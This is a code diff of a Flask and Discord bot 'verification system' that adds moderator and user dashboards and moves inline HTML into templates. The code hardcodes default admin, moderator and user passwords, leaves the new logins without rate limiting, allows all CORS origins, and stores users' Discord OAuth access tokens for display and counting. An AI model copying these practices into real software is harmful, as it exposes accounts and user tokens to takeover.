@@ -2,7 +2,7 @@
 """
 ═══════════════════════════════════════════════════════════════════════════════
                     🔐 ANION VERIFICATION SYSTEM v5.0
-                    FIREBASE + DISCORD OAUTH + PERSISTENT CONFIG
+                    FIREBASE + DISCORD OAUTH + HTML TEMPLATES
 ═══════════════════════════════════════════════════════════════════════════════
 """
 
@@ -16,8 +16,7 @@ import threading
 import asyncio
 import logging
 from datetime import datetime, timedelta
-from flask import Flask, request, redirect, render_template_string, jsonify, session
-from flask_session import Session
+from flask import Flask, request, redirect, render_template, jsonify, session, url_for
 from flask_cors import CORS
 from dotenv import load_dotenv
 
@@ -39,7 +38,6 @@ load_dotenv()
 
 DATA_DIR = '/data'
 os.makedirs(DATA_DIR, exist_ok=True)
-os.makedirs(os.path.join(DATA_DIR, 'flask_session'), exist_ok=True)
 
 # ═════════════════════════════════════════════════════════════════════════════
 # LOGGING
@@ -71,6 +69,14 @@ PORT = int(os.getenv('PORT', 5000))
 # Superadmin
 SUPERADMIN_USERNAME = os.getenv('SUPERADMIN_USERNAME', 'admin')
 SUPERADMIN_PASSWORD = os.getenv('SUPERADMIN_PASSWORD', 'AnionSecure2025!')
+
+# Moderator
+MODERATOR_USERNAME = os.getenv('MODERATOR_USERNAME', 'moderator')
+MODERATOR_PASSWORD = os.getenv('MODERATOR_PASSWORD', 'Moderator2025!')
+
+# User
+USER_USERNAME = os.getenv('USER_USERNAME', 'user')
+USER_PASSWORD = os.getenv('USER_PASSWORD', 'User2025!')
 
 # Firebase
 FIREBASE_URL = os.getenv('FIREBASE_URL')
@@ -317,10 +323,9 @@ flask_app.config['SESSION_COOKIE_SECURE'] = True
 flask_app.config['SESSION_COOKIE_HTTPONLY'] = True
 flask_app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
 CORS(flask_app)
-Session(flask_app)
 
 # ═════════════════════════════════════════════════════════════════════════════
-# FLASK ROUTES - VERIFICATION
+# FLASK ROUTES - VERIFICATION (OAuth)
 # ═════════════════════════════════════════════════════════════════════════════
 
 @flask_app.route('/')
@@ -1111,202 +1116,16 @@ class VerifyBot(commands.Bot):
         logger.info(f"🗑️ Removed {member.display_name} from verified database (left server)")
 
 # ═════════════════════════════════════════════════════════════════════════════
-# SUPERADMIN ROUTES
+# DASHBOARD ROUTES - SUPERADMIN / MODERATOR / USER
 # ═════════════════════════════════════════════════════════════════════════════
 
 login_attempts = {}
 
-@flask_app.route('/superadmin')
-def superadmin_login():
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>🔐 Superadmin Login</title>
-        <style>
-            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap');
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body {
-                font-family: 'Inter', sans-serif;
-                background: #0a0a0f;
-                color: #ffffff;
-                min-height: 100vh;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                overflow: hidden;
-                position: relative;
-            }
-            .bg-gradient {
-                position: fixed;
-                top: -50%;
-                left: -50%;
-                width: 200%;
-                height: 200%;
-                background: radial-gradient(ellipse at 30% 50%, rgba(255, 50, 50, 0.08) 0%, transparent 60%),
-                            radial-gradient(ellipse at 70% 50%, rgba(200, 0, 0, 0.06) 0%, transparent 60%);
-                animation: bgPulse 8s ease-in-out infinite alternate;
-                z-index: 0;
-            }
-            @keyframes bgPulse { 0% { transform: scale(1) rotate(0deg); } 100% { transform: scale(1.1) rotate(3deg); } }
-            .container {
-                position: relative;
-                z-index: 1;
-                max-width: 440px;
-                width: 100%;
-                padding: 40px 35px;
-                background: rgba(20, 20, 30, 0.9);
-                backdrop-filter: blur(24px);
-                border-radius: 24px;
-                border: 1px solid rgba(255, 50, 50, 0.15);
-                box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
-                text-align: center;
-                animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards;
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            @keyframes slideUp { to { opacity: 1; transform: translateY(0); } }
-            .shield-icon { font-size: 56px; margin-bottom: 12px; animation: float 3s ease-in-out infinite; }
-            @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-10px); } }
-            h1 {
-                font-size: 28px;
-                font-weight: 800;
-                background: linear-gradient(135deg, #ff4444 30%, #ff6b6b 100%);
-                -webkit-background-clip: text;
-                -webkit-text-fill-color: transparent;
-                margin-bottom: 4px;
-            }
-            .subtitle { font-size: 13px; color: rgba(255, 255, 255, 0.4); margin-bottom: 28px; }
-            .security-badge {
-                display: inline-flex;
-                align-items: center;
-                gap: 8px;
-                background: rgba(255, 50, 50, 0.12);
-                border: 1px solid rgba(255, 50, 50, 0.2);
-                padding: 6px 14px;
-                border-radius: 100px;
-                font-size: 10px;
-                font-weight: 600;
-                color: #ff6b6b;
-                margin-bottom: 24px;
-                text-transform: uppercase;
-                letter-spacing: 0.5px;
-            }
-            .security-badge .dot { width: 6px; height: 6px; border-radius: 50%; background: #4CAF50; animation: pulseDot 2s infinite; }
-            @keyframes pulseDot { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-            .input-group {
-                text-align: left;
-                margin-bottom: 16px;
-            }
-            .input-group label {
-                font-size: 12px;
-                font-weight: 600;
-                color: rgba(255, 255, 255, 0.5);
-                display: block;
-                margin-bottom: 6px;
-                letter-spacing: 0.5px;
-            }
-            .input-group input {
-                width: 100%;
-                padding: 14px 16px;
-                background: rgba(255, 255, 255, 0.05);
-                border: 1px solid rgba(255, 255, 255, 0.08);
-                border-radius: 12px;
-                color: white;
-                font-size: 15px;
-                font-family: 'Inter', sans-serif;
-                transition: all 0.3s ease;
-            }
-            .input-group input:focus {
-                outline: none;
-                border-color: rgba(255, 50, 50, 0.4);
-                background: rgba(255, 255, 255, 0.08);
-            }
-            .input-group input::placeholder { color: rgba(255, 255, 255, 0.2); }
-            .btn-login {
-                width: 100%;
-                padding: 16px;
-                background: linear-gradient(135deg, #ff4444, #cc0000);
-                color: white;
-                border: none;
-                border-radius: 12px;
-                font-size: 16px;
-                font-weight: 700;
-                cursor: pointer;
-                transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
-                font-family: 'Inter', sans-serif;
-                margin-top: 8px;
-            }
-            .btn-login:hover { transform: translateY(-2px); box-shadow: 0 12px 40px rgba(255, 50, 50, 0.3); }
-            .btn-login:active { transform: scale(0.98); }
-            .error-msg {
-                color: #ff4444;
-                font-size: 13px;
-                margin-top: 12px;
-                display: none;
-                background: rgba(255, 50, 50, 0.1);
-                padding: 10px;
-                border-radius: 8px;
-                border: 1px solid rgba(255, 50, 50, 0.2);
-            }
-            .footer-text { margin-top: 20px; font-size: 11px; color: rgba(255, 255, 255, 0.12); }
-            .particle {
-                position: fixed;
-                border-radius: 50%;
-                pointer-events: none;
-                z-index: 0;
-                background: rgba(255, 50, 50, 0.1);
-                animation: floatParticle 20s infinite linear;
-            }
-            @keyframes floatParticle {
-                0% { transform: translate(0, 0) scale(1); opacity: 0; }
-                10% { opacity: 1; }
-                90% { opacity: 1; }
-                100% { transform: translate(100px, -100px) scale(0); opacity: 0; }
-            }
-            @media (max-width: 480px) {
-                .container { padding: 30px 20px; margin: 16px; }
-                h1 { font-size: 24px; }
-            }
-        </style>
-    </head>
-    <body>
-        <div class="bg-gradient"></div>
-        <div class="particle" style="width:4px;height:4px;top:10%;left:5%;animation-duration:25s;"></div>
-        <div class="particle" style="width:6px;height:6px;top:30%;right:8%;animation-duration:18s;animation-delay:3s;"></div>
-        <div class="container">
-            <div class="shield-icon">🛡️</div>
-            <h1>Superadmin Access</h1>
-            <p class="subtitle">Secure • Encrypted • Authorized Only</p>
-            <div class="security-badge"><span class="dot"></span>256-bit Encryption • Restricted</div>
+# ─── SUPERADMIN ──────────────────────────────────────────────────────────────
 
-            <form method="POST" action="/superadmin-login">
-                <div class="input-group">
-                    <label>👤 Username</label>
-                    <input type="text" name="username" placeholder="Enter username" required autofocus>
-                </div>
-                <div class="input-group">
-                    <label>🔑 Password</label>
-                    <input type="password" name="password" placeholder="Enter password" required>
-                </div>
-                <button type="submit" class="btn-login">🚪 Access Dashboard</button>
-            </form>
-
-            <div class="error-msg" id="errorMsg">❌ Invalid credentials</div>
-
-            <div class="footer-text">🔒 Authorized personnel only • All access is logged</div>
-        </div>
-
-        <script>
-            if (window.location.search.includes('error=1')) {
-                document.getElementById('errorMsg').style.display = 'block';
-            }
-        </script>
-    </body>
-    </html>
-    """)
+@flask_app.route('/superadmin.html')
+def superadmin_login_page():
+    return render_template('superadmin_login.html')
 
 @flask_app.route('/superadmin-login', methods=['POST'])
 def superadmin_login_handler():
@@ -1325,252 +1144,125 @@ def superadmin_login_handler():
         login_attempts[ip] = (0, now)
 
     if username == SUPERADMIN_USERNAME and password == SUPERADMIN_PASSWORD:
-        session['superadmin'] = True
-        session['superadmin_login_time'] = datetime.now().isoformat()
+        session['role'] = 'superadmin'
+        session['username'] = username
+        session['login_time'] = datetime.now().isoformat()
         login_attempts[ip] = (0, now)
         firebase_log('superadmin_login', {'ip': ip, 'username': username})
-        return redirect(url_for('superadmin_dashboard'))
+        return redirect(url_for('superadmin_dashboard_page'))
     else:
         attempts, _ = login_attempts[ip]
         login_attempts[ip] = (attempts + 1, now)
         firebase_log('superadmin_failed_login', {'ip': ip, 'username': username})
-        return redirect(url_for('superadmin_login', error=1))
+        return redirect(url_for('superadmin_login_page', error=1))
 
-@flask_app.route('/superadmin-dashboard')
-def superadmin_dashboard():
-    if not session.get('superadmin'):
-        return redirect(url_for('superadmin_login'))
+@flask_app.route('/superadmin-dashboard.html')
+def superadmin_dashboard_page():
+    if session.get('role') != 'superadmin':
+        return redirect(url_for('superadmin_login_page'))
 
-    users_data = firebase_get_all_users() if FIREBASE_ENABLED else {}
     local_users = db_fetch_all("SELECT * FROM verified_users ORDER BY verified_at DESC LIMIT 100") or []
-
     guilds = []
     if bot_instance:
         for guild in bot_instance.guilds:
             guilds.append({
                 'id': guild.id,
                 'name': guild.name,
-                'member_count': guild.member_count,
-                'icon': guild.icon.url if guild.icon else None
+                'member_count': guild.member_count
             })
 
-    total_users = len(local_users)
-    total_guilds = len(guilds)
     total_tokens = db_fetch_one("SELECT COUNT(*) FROM oauth_tokens")[0] if db_fetch_one("SELECT COUNT(*) FROM oauth_tokens") else 0
 
-    return render_template_string("""
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>📊 Superadmin Dashboard</title>
-        <style>
-            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap');
-            * { margin: 0; padding: 0; box-sizing: border-box; }
-            body {
-                font-family: 'Inter', sans-serif;
-                background: #0a0a0f;
-                color: #ffffff;
-                padding: 20px;
-                min-height: 100vh;
-            }
-            .container { max-width: 1400px; margin: 0 auto; }
-            .header {
-                display: flex;
-                justify-content: space-between;
-                align-items: center;
-                padding: 20px 0;
-                border-bottom: 1px solid rgba(255,255,255,0.05);
-                margin-bottom: 30px;
-                flex-wrap: wrap;
-                gap: 15px;
-            }
-            .header h1 {
-                font-size: 28px;
-                font-weight: 800;
-                background: linear-gradient(135deg, #ff4444, #ff6b6b);
-                -webkit-background-clip: text;
-                -webkit-text-fill-color: transparent;
-            }
-            .header .badge {
-                background: rgba(255,50,50,0.15);
-                border: 1px solid rgba(255,50,50,0.3);
-                padding: 8px 16px;
-                border-radius: 100px;
-                font-size: 12px;
-                color: #ff6b6b;
-                display: flex;
-                align-items: center;
-                gap: 8px;
-            }
-            .header .badge .dot { width: 8px; height: 8px; border-radius: 50%; background: #4CAF50; animation: pulseDot 2s infinite; }
-            @keyframes pulseDot { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-            .logout-btn {
-                padding: 10px 24px;
-                background: rgba(255,50,50,0.15);
-                border: 1px solid rgba(255,50,50,0.3);
-                border-radius: 10px;
-                color: #ff6b6b;
-                text-decoration: none;
-                font-size: 14px;
-                font-weight: 600;
-                transition: all 0.3s ease;
-            }
-            .logout-btn:hover { background: rgba(255,50,50,0.25); }
-            .stats {
-                display: grid;
-                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-                gap: 16px;
-                margin-bottom: 30px;
-            }
-            .stat-card {
-                background: rgba(255,255,255,0.03);
-                border: 1px solid rgba(255,255,255,0.05);
-                border-radius: 16px;
-                padding: 24px;
-                text-align: center;
-                transition: all 0.3s ease;
-            }
-            .stat-card:hover {
-                background: rgba(255,255,255,0.06);
-                border-color: rgba(255,255,255,0.08);
-            }
-            .stat-number { font-size: 2.5em; font-weight: 800; color: #ff6b6b; }
-            .stat-label { font-size: 13px; color: rgba(255,255,255,0.4); margin-top: 4px; font-weight: 400; }
-            .section {
-                background: rgba(255,255,255,0.02);
-                border: 1px solid rgba(255,255,255,0.04);
-                border-radius: 16px;
-                padding: 24px;
-                margin-bottom: 24px;
-            }
-            .section h2 { font-size: 18px; font-weight: 700; margin-bottom: 16px; color: rgba(255,255,255,0.8); }
-            table { width: 100%; border-collapse: collapse; font-size: 13px; }
-            th {
-                text-align: left;
-                padding: 12px 12px;
-                color: rgba(255,255,255,0.3);
-                font-weight: 600;
-                border-bottom: 1px solid rgba(255,255,255,0.05);
-                text-transform: uppercase;
-                font-size: 10px;
-                letter-spacing: 0.5px;
-            }
-            td {
-                padding: 12px 12px;
-                border-bottom: 1px solid rgba(255,255,255,0.03);
-                color: rgba(255,255,255,0.7);
-            }
-            td .token {
-                font-family: monospace;
-                font-size: 11px;
-                color: #ff6b6b;
-                word-break: break-all;
-                max-width: 150px;
-                display: inline-block;
-            }
-            .guild-list {
-                display: flex;
-                flex-wrap: wrap;
-                gap: 8px;
-            }
-            .guild-tag {
-                background: rgba(255,255,255,0.05);
-                padding: 4px 12px;
-                border-radius: 20px;
-                font-size: 12px;
-                color: rgba(255,255,255,0.6);
-                border: 1px solid rgba(255,255,255,0.04);
-            }
-            .empty-state { color: rgba(255,255,255,0.2); text-align: center; padding: 30px; font-size: 14px; }
-            @media (max-width: 768px) {
-                .header { flex-direction: column; align-items: flex-start; }
-                .stats { grid-template-columns: repeat(2, 1fr); }
-                table { font-size: 11px; }
-                td, th { padding: 8px 8px; }
-            }
-            @media (max-width: 480px) { .stats { grid-template-columns: 1fr; } }
-            .scrollable { overflow-x: auto; max-height: 400px; overflow-y: auto; }
-            .scrollable::-webkit-scrollbar { width: 4px; }
-            .scrollable::-webkit-scrollbar-track { background: transparent; }
-            .scrollable::-webkit-scrollbar-thumb { background: rgba(255,50,50,0.3); border-radius: 4px; }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div class="header">
-                <div>
-                    <h1>🛡️ Superadmin Dashboard</h1>
-                    <div style="font-size:13px;color:rgba(255,255,255,0.3);margin-top:4px;">{{ login_time }}</div>
-                </div>
-                <div style="display:flex;align-items:center;gap:12px;">
-                    <span class="badge"><span class="dot"></span> Secure Session</span>
-                    <a href="/superadmin-logout" class="logout-btn">🚪 Logout</a>
-                </div>
-            </div>
-
-            <div class="stats">
-                <div class="stat-card"><div class="stat-number">{{ total_users }}</div><div class="stat-label">Verified Users</div></div>
-                <div class="stat-card"><div class="stat-number">{{ total_guilds }}</div><div class="stat-label">Servers</div></div>
-                <div class="stat-card"><div class="stat-number">{{ total_tokens }}</div><div class="stat-label">OAuth Tokens</div></div>
-                <div class="stat-card"><div class="stat-number">{{ firebase_status }}</div><div class="stat-label">Firebase Status</div></div>
-            </div>
-
-            <div class="section">
-                <h2>🏰 Servers ({{ total_guilds }})</h2>
-                <div class="guild-list">
-                    {% for guild in guilds %}
-                    <span class="guild-tag"># {{ guild.name }} ({{ guild.member_count }})</span>
-                    {% endfor %}
-                </div>
-            </div>
-
-            <div class="section">
-                <h2>👤 Verified Users ({{ total_users }})</h2>
-                <div class="scrollable">
-                    <table>
-                        <thead>
-                            <tr><th>User</th><th>Email</th><th>Guild</th><th>Access Token</th><th>Verified At</th></tr>
-                        </thead>
-                        <tbody>
-                            {% for user in users %}
-                            <tr>
-                                <td><strong>{{ user.username or 'Unknown' }}</strong></td>
-                                <td>{{ user.email or 'N/A' }}</td>
-                                <td>{{ user.guild_id or 'N/A' }}</td>
-                                <td><span class="token">{{ user.access_token[:30] if user.access_token else 'None' }}...</span></td>
-                                <td>{{ user.verified_at[:16] if user.verified_at else 'N/A' }}</td>
-                            </tr>
-                            {% else %}
-                            <tr><td colspan="5" class="empty-state">No users verified yet</td></tr>
-                            {% endfor %}
-                        </tbody>
-                    </table>
-                </div>
-            </div>
-
-            <div style="text-align:center;color:rgba(255,255,255,0.1);font-size:11px;padding:20px 0;">
-                🔒 All access is logged • Anion Security System v5.0
-            </div>
-        </div>
-    </body>
-    </html>
-    """,
-    total_users=total_users,
-    total_guilds=total_guilds,
-    total_tokens=total_tokens,
-    guilds=guilds,
-    users=local_users,
-    firebase_status='🟢 Online' if FIREBASE_ENABLED else '🔴 Offline',
-    login_time=session.get('superadmin_login_time', 'Just now')
+    return render_template('superadmin_dashboard.html',
+        total_users=len(local_users),
+        total_guilds=len(guilds),
+        total_tokens=total_tokens,
+        guilds=guilds,
+        users=local_users,
+        firebase_status='🟢 Online' if FIREBASE_ENABLED else '🔴 Offline',
+        login_time=session.get('login_time', 'Just now')
     )
 
 @flask_app.route('/superadmin-logout')
 def superadmin_logout():
-    session.pop('superadmin', None)
-    session.pop('superadmin_login_time', None)
-    return redirect(url_for('superadmin_login'))
+    session.clear()
+    return redirect(url_for('superadmin_login_page'))
+
+# ─── MODERATOR ──────────────────────────────────────────────────────────────
+
+@flask_app.route('/moderator.html')
+def moderator_login_page():
+    return render_template('moderator_login.html')
+
+@flask_app.route('/moderator-login', methods=['POST'])
+def moderator_login_handler():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    if username == MODERATOR_USERNAME and password == MODERATOR_PASSWORD:
+        session['role'] = 'moderator'
+        session['username'] = username
+        session['login_time'] = datetime.now().isoformat()
+        firebase_log('moderator_login', {'username': username})
+        return redirect(url_for('moderator_dashboard_page'))
+    else:
+        return redirect(url_for('moderator_login_page', error=1))
+
+@flask_app.route('/moderator-dashboard.html')
+def moderator_dashboard_page():
+    if session.get('role') != 'moderator':
+        return redirect(url_for('moderator_login_page'))
+
+    local_users = db_fetch_all("SELECT * FROM verified_users ORDER BY verified_at DESC LIMIT 100") or []
+
+    return render_template('moderator_dashboard.html',
+        total_users=len(local_users),
+        total_servers=len(bot_instance.guilds) if bot_instance else 0,
+        users=local_users,
+        login_time=session.get('login_time', 'Just now')
+    )
+
+@flask_app.route('/moderator-logout')
+def moderator_logout():
+    session.clear()
+    return redirect(url_for('moderator_login_page'))
+
+# ─── USER ───────────────────────────────────────────────────────────────────
+
+@flask_app.route('/user.html')
+def user_login_page():
+    return render_template('user_login.html')
+
+@flask_app.route('/user-login', methods=['POST'])
+def user_login_handler():
+    username = request.form.get('username')
+    password = request.form.get('password')
+
+    if username == USER_USERNAME and password == USER_PASSWORD:
+        session['role'] = 'user'
+        session['username'] = username
+        session['login_time'] = datetime.now().isoformat()
+        return redirect(url_for('user_dashboard_page'))
+    else:
+        return redirect(url_for('user_login_page', error=1))
+
+@flask_app.route('/user-dashboard.html')
+def user_dashboard_page():
+    if session.get('role') != 'user':
+        return redirect(url_for('user_login_page'))
+
+    return render_template('user_dashboard.html',
+        username=session.get('username', 'User'),
+        user_id=session.get('user_id', 'Unknown'),
+        email=session.get('email', 'Not provided'),
+        servers_count=len(bot_instance.guilds) if bot_instance else 0,
+        login_time=session.get('login_time', 'Just now')
+    )
+
+@flask_app.route('/user-logout')
+def user_logout():
+    session.clear()
+    return redirect(url_for('user_login_page'))
 
 # ═════════════════════════════════════════════════════════════════════════════
 # MAIN
@@ -1585,6 +1277,9 @@ async def main():
     global bot_instance
     logger.info("🚀 Starting Verification System...")
     logger.info("=" * 70)
+
+    # Create templates directory if not exists
+    os.makedirs('templates', exist_ok=True)
 
     flask_thread = threading.Thread(target=run_flask)
     flask_thread.daemon = True
